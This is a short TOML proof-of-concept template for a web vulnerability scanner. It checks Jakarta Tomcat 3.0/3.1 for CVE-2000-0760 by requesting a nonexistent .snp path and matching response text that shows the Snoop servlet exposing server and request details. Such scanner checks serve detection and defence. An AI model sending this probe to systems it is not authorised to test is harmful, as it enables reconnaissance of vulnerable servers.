[info]
author = "ave"
description = "通过请求不存在的 .snp 扩展名路径，触发 Snoop Servlet 返回系统环境变量、请求参数等敏感信息"
id = "POC-AVE-2000-0002"
name = "Jakarta Tomcat 3.1 and 3.0 - Information Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0002"]
vuln_id = [
    "CVE-2000-0760",
    "AVE-2000-0002",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/examples/jsp/snp/anything.snp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Request Information",
    "Path info",
    "Server name",
    "Remote address",
]
